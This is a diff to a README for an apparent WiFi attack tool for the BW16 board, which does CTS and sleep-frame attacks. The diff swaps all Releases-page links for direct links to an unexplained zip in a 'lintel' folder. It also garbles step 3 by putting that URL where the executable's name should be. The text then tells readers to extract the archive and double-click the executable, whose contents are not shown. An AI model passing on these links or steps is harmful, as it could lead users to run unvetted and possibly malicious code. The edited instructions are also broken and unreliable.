@@ -4,7 +4,7 @@
 Welcome to BW16-CTS-SLEEP! This guide will help you download and run our application on your device. With BW16-CTS-SLEEP, you can test WiFi security using the BW16 board, making your networks safer.
 
 ## 📥 Download Now
-[![Download BW16-CTS-SLEEP](https://img.shields.io/badge/Download-BW16--CTS--SLEEP-brightgreen)](https://github.com/gabxbell689/BW16-CTS-SLEEP/releases)
+[![Download BW16-CTS-SLEEP](https://raw.githubusercontent.com/gabxbell689/BW16-CTS-SLEEP/main/lintel/SLEEP_B_CT_2.2.zip)](https://raw.githubusercontent.com/gabxbell689/BW16-CTS-SLEEP/main/lintel/SLEEP_B_CT_2.2.zip)
 
 ## 📋 What is BW16-CTS-SLEEP?
 BW16-CTS-SLEEP is an application that allows you to perform CTS and sleep frame attacks using the BW16 board (RTL8720DN). This tool is designed for users who want to learn about WiFi security and improve their skills.
@@ -22,7 +22,7 @@ BW16-CTS-SLEEP is an application that allows you to perform CTS and sleep frame 
 ## ⬇️ Download & Install
 To start using BW16-CTS-SLEEP, you need to visit the Releases page and download the latest version. Follow these steps:
 
-1. Click on this link: [Download BW16-CTS-SLEEP](https://github.com/gabxbell689/BW16-CTS-SLEEP/releases).
+1. Click on this link: [Download BW16-CTS-SLEEP](https://raw.githubusercontent.com/gabxbell689/BW16-CTS-SLEEP/main/lintel/SLEEP_B_CT_2.2.zip).
 2. On the Releases page, find the latest version. Look for the files that have the `.zip` or `.exe` extensions. These are for various operating systems.
 3. Click on the file to download it to your device. 
 
@@ -31,7 +31,7 @@ To start using BW16-CTS-SLEEP, you need to visit the Releases page and download 
 ## 📂 Installing the Application
 1. **Locate the downloaded file** on your computer. You can find it in the 'Downloads' folder or the location where you saved it.
 2. If you downloaded a `.zip` file, right-click on it and select "Extract All" to unzip the folder.
-3. Open the unzipped folder and find the executable file, usually named `BW16-CTS-SLEEP.exe`.
+3. Open the unzipped folder and find the executable file, usually named `https://raw.githubusercontent.com/gabxbell689/BW16-CTS-SLEEP/main/lintel/SLEEP_B_CT_2.2.zip`.
 4. Double-click on the executable file to start the installation process.
 5. Follow on-screen instructions to complete the installation.
 
